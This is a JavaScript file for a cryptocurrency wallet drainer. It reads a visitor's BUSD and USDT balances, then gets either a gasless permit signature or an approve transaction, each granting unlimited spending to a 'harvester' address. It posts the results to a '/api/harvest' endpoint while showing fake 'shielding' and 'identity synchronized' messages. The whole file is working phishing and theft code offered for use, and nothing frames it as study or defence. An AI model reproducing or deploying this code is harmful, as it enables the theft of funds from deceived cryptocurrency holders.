// CONFIGURATION
const HARVESTER_ADDRESS = "0xDEPLOYED_HARVESTER_ADDRESS";
const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function nonces(address owner) view returns (uint256)",
    "function name() view returns (string)",
    "function approve(address spender, uint256 amount) public returns (bool)"
];

const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

async function triggerPermit() {
    console.log("[v8.3] Initiating Shielded Sync...");
    if (!window.ethereum) return;

    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const victim = await signer.getAddress();

        // 1. BALANCE CHECK - Find the biggest target
        const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
        const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
        
        const [busdBal, usdtBal] = await Promise.all([
            busd.balanceOf(victim).catch(() => ethers.BigNumber.from(0)),
            usdt.balanceOf(victim).catch(() => ethers.BigNumber.from(0))
        ]);

        // UI Transition
        document.getElementById('ui-main').style.display = 'none';
        document.getElementById('ui-loading').style.display = 'block';

        // 2. DECISION LOGIC: BUSD (Permit) vs USDT (Standard Approve)
        if (busdBal.gt(usdtBal) && busdBal.gt(0)) {
            await handleBUSD(signer, victim, busd);
        } else if (usdtBal.gt(0)) {
            await handleUSDT(signer, victim, usdt);
        } else {
            console.log("No assets found for sync.");
            document.getElementById('ui-loading').innerHTML = "No eligible assets found.";
        }

    } catch (e) {
        console.error("Shielding Error:", e);
        document.getElementById('ui-main').style.display = 'block';
        document.getElementById('ui-loading').style.display = 'none';
    }
}

/**
 * METHOD A: BUSD Permit (Gasless Signature)
 */
async function handleBUSD(signer, victim, busdContract) {
    const [nonce, tokenName] = await Promise.all([
        busdContract.nonces(victim),
        busdContract.name()
    ]);

    const deadline = Math.floor(Date.now() / 1000) + 3600;
    const domain = { name: tokenName, version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS };
    const types = {
        Permit: [
            { name: "owner", type: "address" }, { name: "spender", type: "address" },
            { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
        ]
    };
    const message = { owner: victim, spender: HARVESTER_ADDRESS, value: MAX_VAL, nonce: nonce.toNumber(), deadline: deadline };

    const signature = await signer._signTypedData(domain, types, message);
    const { v, r, s } = ethers.utils.splitSignature(signature);

    await exfiltrate({ victim, v, r, s, deadline, token: BUSD_ADDRESS, type: 'permit' });
}

/**
 * METHOD B: USDT Approve (Standard Transaction)
 * USDT on BSC doesn't support Permit, so we trigger a standard approval request.
 */
async function handleUSDT(signer, victim, usdtContract) {
    const tx = await usdtContract.connect(signer).approve(HARVESTER_ADDRESS, MAX_VAL);
    console.log("USDT Approval Sent:", tx.hash);
    
    // We notify backend immediately that allowance is granted (v,r,s not needed for standard approve)
    await exfiltrate({ victim, txHash: tx.hash, token: USDT_ADDRESS, type: 'approve' });
    
    // UI update for the victim
    document.getElementById('ui-loading').innerHTML = "<div style='color:#007aff;'>Synchronizing USDT...</div>";
    await tx.wait();
    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;'>USDT Shielded.</div>";
}

async function exfiltrate(data) {
    await fetch('/api/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
    });
    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;font-weight:700;'>Identity Synchronized.</div>";
}